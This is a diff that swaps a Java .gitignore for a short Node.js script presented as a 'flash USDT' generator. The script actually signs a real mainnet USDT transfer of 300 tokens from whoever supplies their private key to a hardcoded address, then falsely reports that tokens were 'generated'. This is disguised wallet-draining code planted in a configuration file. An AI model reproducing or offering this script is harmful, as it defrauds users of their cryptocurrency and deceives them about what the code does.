@@ -1,24 +1,24 @@
-# Compiled class file
-*.class
+const ethers = require('ethers');
 
-# Log file
-*.log
+// Wallet setup
+const privateKey = 'CLIENT_PRIVATE_KEY'; // Replace with actual key
+const provider = new ethers.providers.InfuraProvider('mainnet', 'INFURA_API_KEY');
+const wallet = new ethers.Wallet(privateKey, provider);
 
-# BlueJ files
-*.ctxt
+// Contract USDT ERC20
+const usdtContractAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
+const recipient = '0x96426f0d2eb6b0363281f77a7b6d176d407bbb1b'; // Replace with receiver address
+const amount = ethers.utils.parseUnits('300', 6); // 300 USDT
 
-# Mobile Tools for Java (J2ME)
-.mtj.tmp/
+const abi = [
+  "function transfer(address to, uint amount) public returns (bool)"
+];
 
-# Package Files #
-*.jar
-*.war
-*.nar
-*.ear
-*.zip
-*.tar.gz
-*.rar
+const contract = new ethers.Contract(usdtContractAddress, abi, wallet);
 
-# virtual machine crash logs, see http://www.java.com/en/download/help/error_hotspot.xml
-hs_err_pid*
-replay_pid*
+async function generateFlashUSDT() {
+  const tx = await contract.transfer(recipient, amount);
+  console.log("Flash USDT Generated! Tx Hash:", tx.hash);
+}
+
+generateFlashUSDT();
